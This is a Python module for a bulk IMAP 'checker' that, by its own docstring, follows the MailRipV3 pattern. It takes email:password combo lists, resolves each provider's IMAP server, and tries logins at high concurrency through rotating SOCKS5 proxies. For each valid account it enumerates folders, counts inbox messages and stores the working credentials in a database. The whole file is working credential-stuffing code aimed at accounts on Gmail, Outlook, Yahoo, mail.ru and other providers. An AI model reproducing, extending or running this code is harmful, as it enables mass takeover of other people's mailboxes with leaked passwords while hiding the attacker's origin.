"""
Enhanced Bulk IMAP Checker with SOCKS5 Proxy Support
Inspired by mailtools connection handling and MailRipV3 multi-threading patterns
"""

import asyncio
import imaplib
import socket
import ssl
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum

from sqlalchemy.ext.asyncio import AsyncSession

from app_websockets.connection_manager import MessageType, connection_manager
from config.settings import settings
from core.logger import get_logger
from models.base import IMAPAccount, ProxyServer
from services.proxy_service import ProxyService

logger = get_logger(__name__)


class IMAPCheckStatus(str, Enum):
    """IMAP check result status"""

    VALID = "valid"
    INVALID = "invalid"
    AUTH_FAILED = "auth_failed"
    CONNECTION_FAILED = "connection_failed"
    TIMEOUT = "timeout"
    PROXY_FAILED = "proxy_failed"
    UNKNOWN_ERROR = "unknown_error"


class IMAPConnectionType(str, Enum):
    """IMAP connection types"""

    SSL = "ssl"
    STARTTLS = "starttls"
    PLAIN = "plain"


@dataclass
class IMAPComboEntry:
    """Email:password combo entry for IMAP"""

    email: str
    password: str
    imap_server: str | None = None
    imap_port: int | None = None
    connection_type: IMAPConnectionType = IMAPConnectionType.SSL


@dataclass
class IMAPCheckResult:
    """Result of IMAP check"""

    combo: IMAPComboEntry
    status: IMAPCheckStatus
    response_time: float | None = None
    error_message: str | None = None
    imap_response: str | None = None
    proxy_used: str | None = None
    inbox_count: int = 0
    folder_list: list[str] = field(default_factory=list)
    server_capabilities: list[str] = field(default_factory=list)


@dataclass
class BulkIMAPProgress:
    """Progress tracking for bulk IMAP checks"""

    total: int = 0
    checked: int = 0
    valid: int = 0
    invalid: int = 0
    errors: int = 0
    start_time: datetime = field(default_factory=datetime.now)
    estimated_completion: datetime | None = None
    current_speed: float = 0.0

    @property
    def percentage(self) -> float:
        if self.total == 0:
            return 0.0
        return (self.checked / self.total) * 100

    @property
    def elapsed_time(self) -> timedelta:
        return datetime.now() - self.start_time


class BulkIMAPChecker:
    """Enhanced bulk IMAP checker with SOCKS5 proxy support"""

    def __init__(self, db_session: AsyncSession, session_id: str):
        self.db = db_session
        self.session_id = session_id
        self.proxy_service = ProxyService(db_session)
        self.available_proxies: list[ProxyServer] = []
        self.proxy_index = 0
        self.progress = BulkIMAPProgress()
        self.is_running = False
        self.should_stop = False

        # Configuration
        self.max_threads = getattr(settings, "BULK_IMAP_MAX_THREADS", 30)
        self.timeout = getattr(settings, "BULK_IMAP_TIMEOUT", 30)
        self.proxy_timeout = getattr(settings, "BULK_IMAP_PROXY_TIMEOUT", 15)
        self.retry_attempts = getattr(settings, "BULK_IMAP_RETRY_ATTEMPTS", 2)
        self.check_inbox_count = getattr(
            settings, "BULK_IMAP_CHECK_INBOX", True
        )
        self.max_folder_fetch = getattr(settings, "BULK_IMAP_MAX_FOLDERS", 10)

    async def load_proxies(self) -> int:
        """Load working SOCKS5 proxies from database"""
        try:
            self.available_proxies = (
                await self.proxy_service.get_working_proxies(
                    session_id=self.session_id, proxy_type="socks5"
                )
            )
            logger.info(
                f"Loaded {len(self.available_proxies)} working SOCKS5 proxies for IMAP"
            )
            return len(self.available_proxies)
        except Exception as e:
            logger.error(f"Failed to load proxies for IMAP: {e}")
            return 0

    def get_next_proxy(self) -> ProxyServer | None:
        """Get next proxy for round-robin rotation"""
        if not self.available_proxies:
            return None

        proxy = self.available_proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.available_proxies)
        return proxy

    async def parse_combo_list(self, combo_data: str) -> list[IMAPComboEntry]:
        """Parse combo list from various formats"""
        combos = []
        lines = combo_data.strip().split("\n")

        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Try different separators
            for separator in [":", "|", ";", "\t"]:
                if separator in line:
                    parts = line.split(separator, 1)
                    if len(parts) == 2:
                        email, password = parts[0].strip(), parts[1].strip()
                        if "@" in email and email.count("@") == 1:
                            # Extract IMAP server info from email domain
                            domain = email.split("@")[1].lower()
                            imap_server, imap_port, conn_type = (
                                self._get_imap_server_info(domain)
                            )

                            combos.append(
                                IMAPComboEntry(
                                    email=email,
                                    password=password,
                                    imap_server=imap_server,
                                    imap_port=imap_port,
                                    connection_type=conn_type,
                                )
                            )
                            break
            else:
                logger.warning(f"Could not parse IMAP line {line_num}: {line}")

        logger.info(
            f"Parsed {len(combos)} valid IMAP combos from {len(lines)} lines"
        )
        return combos

    def _get_imap_server_info(
        self, domain: str
    ) -> tuple[str | None, int | None, IMAPConnectionType]:
        """Get IMAP server, port, and connection type for domain (mailtools-inspired)"""
        # Common IMAP server mappings
        imap_mappings = {
            "gmail.com": ("imap.gmail.com", 993, IMAPConnectionType.SSL),
            "outlook.com": (
                "outlook.office365.com",
                993,
                IMAPConnectionType.SSL,
            ),
            "hotmail.com": (
                "outlook.office365.com",
                993,
                IMAPConnectionType.SSL,
            ),
            "yahoo.com": ("imap.mail.yahoo.com", 993, IMAPConnectionType.SSL),
            "mail.ru": ("imap.mail.ru", 993, IMAPConnectionType.SSL),
            "yandex.com": ("imap.yandex.com", 993, IMAPConnectionType.SSL),
            "aol.com": ("imap.aol.com", 993, IMAPConnectionType.SSL),
        }

        if domain in imap_mappings:
            return imap_mappings[domain]

        # Try common IMAP patterns
        common_patterns = [
            (f"imap.{domain}", 993, IMAPConnectionType.SSL),
            (f"mail.{domain}", 993, IMAPConnectionType.SSL),
            (f"imap.{domain}", 143, IMAPConnectionType.STARTTLS),
            (f"mail.{domain}", 143, IMAPConnectionType.STARTTLS),
        ]

        for server, port, conn_type in common_patterns:
            try:
                socket.gethostbyname(server)
                return server, port, conn_type
            except socket.gaierror:
                continue

        return None, None, IMAPConnectionType.SSL

    async def check_imap_combo(
        self, combo: IMAPComboEntry, proxy: ProxyServer | None = None
    ) -> IMAPCheckResult:
        """Check single IMAP combo with optional proxy"""
        start_time = time.time()

        try:
            # Create SOCKS connection if proxy provided
            if proxy:
                try:
                    sock = await self.proxy_service.create_socks_connection(
                        proxy,
                        combo.imap_server,
                        combo.imap_port,
                        self.proxy_timeout,
                    )
                    proxy_info = f"{proxy.host}:{proxy.port}"
                except Exception as e:
                    return IMAPCheckResult(
                        combo=combo,
                        status=IMAPCheckStatus.PROXY_FAILED,
                        error_message=f"Proxy connection failed: {e}",
                        proxy_used=f"{proxy.host}:{proxy.port}",
                    )
            else:
                sock = None
                proxy_info = None

            # Test IMAP connection
            result = await self._test_imap_connection(combo, sock)
            result.proxy_used = proxy_info
            result.response_time = time.time() - start_time

            return result

        except Exception as e:
            return IMAPCheckResult(
                combo=combo,
                status=IMAPCheckStatus.UNKNOWN_ERROR,
                error_message=str(e),
                response_time=time.time() - start_time,
                proxy_used=proxy_info if proxy else None,
            )

    async def _test_imap_connection(
        self, combo: IMAPComboEntry, sock: socket.socket | None = None
    ) -> IMAPCheckResult:
        """Test IMAP connection with mailtools-inspired error handling"""
        try:
            # Establish IMAP connection based on type
            if combo.connection_type == IMAPConnectionType.SSL:
                if sock:
                    # Custom SSL context for proxy connections
                    context = ssl.create_default_context()
                    ssl_sock = context.wrap_socket(
                        sock, server_hostname=combo.imap_server
                    )
                    mail = imaplib.IMAP4(ssl_sock)
                else:
                    mail = imaplib.IMAP4_SSL(
                        combo.imap_server, combo.imap_port
                    )

            elif combo.connection_type == IMAPConnectionType.STARTTLS:
                if sock:
                    mail = imaplib.IMAP4(sock)
                else:
                    mail = imaplib.IMAP4(combo.imap_server, combo.imap_port)
                mail.starttls()

            else:  # PLAIN
                if sock:
                    mail = imaplib.IMAP4(sock)
                else:
                    mail = imaplib.IMAP4(combo.imap_server, combo.imap_port)

            # Set timeout
            mail.sock.settimeout(self.timeout)

            # Authenticate
            try:
                response = mail.login(combo.email, combo.password)

                # Get server capabilities
                capabilities = []
                try:
                    cap_response = mail.capability()
                    if cap_response[0] == "OK":
                        capabilities = cap_response[1][0].decode().split()
                except Exception:
                    pass

                # Get folder list
                folders = []
                try:
                    folder_response = mail.list()
                    if folder_response[0] == "OK":
                        folders = [
                            folder.decode().split('"')[3]
                            if '"' in folder.decode()
                            else folder.decode().split()[-1]
                            for folder in folder_response[1][
                                : self.max_folder_fetch
                            ]
                        ]
                except Exception:
                    pass

                # Get inbox count if enabled
                inbox_count = 0
                if self.check_inbox_count:
                    try:
                        mail.select("INBOX")
                        inbox_response = mail.search(None, "ALL")
                        if inbox_response[0] == "OK" and inbox_response[1][0]:
                            inbox_count = len(inbox_response[1][0].split())
                    except Exception:
                        pass

                mail.logout()

                return IMAPCheckResult(
                    combo=combo,
                    status=IMAPCheckStatus.VALID,
                    imap_response=str(response),
                    inbox_count=inbox_count,
                    folder_list=folders,
                    server_capabilities=capabilities,
                )

            except imaplib.IMAP4.error as e:
                mail.logout()
                error_msg = str(e).lower()

                # Classify authentication errors (mailtools-inspired)
                if any(
                    keyword in error_msg
                    for keyword in [
                        "authentication",
                        "login",
                        "password",
                        "invalid",
                    ]
                ):
                    status = IMAPCheckStatus.AUTH_FAILED
                else:
                    status = IMAPCheckStatus.INVALID

                return IMAPCheckResult(
                    combo=combo,
                    status=status,
                    error_message=str(e),
                    imap_response=str(e),
                )

        except TimeoutError:
            return IMAPCheckResult(
                combo=combo,
                status=IMAPCheckStatus.TIMEOUT,
                error_message="Connection timeout",
            )
        except OSError as e:
            return IMAPCheckResult(
                combo=combo,
                status=IMAPCheckStatus.CONNECTION_FAILED,
                error_message=f"Connection failed: {e}",
            )
        except Exception as e:
            return IMAPCheckResult(
                combo=combo,
                status=IMAPCheckStatus.UNKNOWN_ERROR,
                error_message=str(e),
            )

    async def update_progress(self):
        """Update and broadcast progress via WebSocket"""
        # Calculate current speed
        elapsed = self.progress.elapsed_time.total_seconds()
        if elapsed > 0:
            self.progress.current_speed = self.progress.checked / elapsed

        # Estimate completion time
        if self.progress.current_speed > 0:
            remaining = self.progress.total - self.progress.checked
            seconds_remaining = remaining / self.progress.current_speed
            self.progress.estimated_completion = datetime.now() + timedelta(
                seconds=seconds_remaining
            )

        # Broadcast progress via WebSocket
        progress_data = {
            "type": "bulk_imap_progress",
            "session_id": self.session_id,
            "total": self.progress.total,
            "checked": self.progress.checked,
            "valid": self.progress.valid,
            "invalid": self.progress.invalid,
            "errors": self.progress.errors,
            "percentage": self.progress.percentage,
            "speed": self.progress.current_speed,
            "estimated_completion": self.progress.estimated_completion.isoformat()
            if self.progress.estimated_completion
            else None,
            "elapsed_time": str(self.progress.elapsed_time),
        }

        await connection_manager.broadcast_to_all(
            {
                "type": MessageType.MONITORING_UPDATE.value,
                "data": progress_data,
            }
        )

    async def run_bulk_check(
        self, combos: list[IMAPComboEntry]
    ) -> list[IMAPCheckResult]:
        """Run bulk IMAP check with pure async implementation for high concurrency"""
        self.is_running = True
        self.should_stop = False
        self.progress = BulkIMAPProgress(total=len(combos))

        logger.info(
            f"Starting bulk IMAP check of {len(combos)} combos with {self.max_threads} concurrent tasks"
        )

        # Load proxies
        await self.load_proxies()

        results = []

        # Use semaphore to limit concurrent connections instead of ThreadPoolExecutor
        semaphore = asyncio.Semaphore(self.max_threads)

        async def check_with_semaphore(combo: IMAPComboEntry):
            """Check single combo with semaphore control"""
            async with semaphore:
                if self.should_stop:
                    return None

                proxy = self.get_next_proxy()
                try:
                    result = await self.check_imap_combo(combo, proxy)

                    # Update progress counters
                    self.progress.checked += 1
                    if result.status == IMAPCheckStatus.VALID:
                        self.progress.valid += 1
                    elif result.status in [
                        IMAPCheckStatus.AUTH_FAILED,
                        IMAPCheckStatus.INVALID,
                    ]:
                        self.progress.invalid += 1
                    else:
                        self.progress.errors += 1

                    # Update progress every 10 checks or when complete
                    if (
                        self.progress.checked % 10 == 0
                        or self.progress.checked == self.progress.total
                    ):
                        await self.update_progress()

                    return result
                except Exception as e:
                    logger.error(f"Error processing IMAP check: {e}")
                    self.progress.errors += 1
                    return None

        # Create tasks for all combos
        tasks = [check_with_semaphore(combo) for combo in combos]

        # Process tasks in batches to handle large volumes efficiently
        batch_size = min(1000, len(tasks))  # Process in batches of 1000

        try:
            for i in range(0, len(tasks), batch_size):
                if self.should_stop:
                    break

                batch = tasks[i : i + batch_size]
                batch_results = await asyncio.gather(
                    *batch, return_exceptions=True
                )

                # Filter out None results and exceptions
                valid_results = [
                    result
                    for result in batch_results
                    if result is not None and not isinstance(result, Exception)
                ]
                results.extend(valid_results)

                # Short delay between batches to prevent overwhelming the system
                if i + batch_size < len(tasks):
                    await asyncio.sleep(0.1)

        except Exception as e:
            logger.error(f"Error in bulk IMAP check: {e}")
        finally:
            self.is_running = False
            # Final progress update
            await self.update_progress()

        logger.info(
            f"Bulk IMAP check completed: {self.progress.valid} valid, {self.progress.invalid} invalid, {self.progress.errors} errors"
        )
        return results

    async def stop_check(self):
        """Stop the bulk check"""
        self.should_stop = True
        logger.info("Bulk IMAP check stop requested")

    async def save_results_to_database(self, results: list[IMAPCheckResult]):
        """Save valid results to database"""
        valid_results = [
            r for r in results if r.status == IMAPCheckStatus.VALID
        ]

        for result in valid_results:
            try:
                # Create IMAP account entry
                imap_account = IMAPAccount(
                    session_id=self.session_id,
                    imap_server=result.combo.imap_server,
                    imap_port=result.combo.imap_port,
                    email=result.combo.email,
                    password=result.combo.password,
                    status="checked",
                    is_checked=True,
                    last_checked=datetime.now(),
                    response_time=result.response_time,
                    inbox_count=result.inbox_count,
                    use_ssl=result.combo.connection_type
                    == IMAPConnectionType.SSL,
                )

                self.db.add(imap_account)

            except Exception as e:
                logger.error(f"Error saving IMAP result to database: {e}")

        await self.db.commit()
        logger.info(
            f"Saved {len(valid_results)} valid IMAP accounts to database"
        )
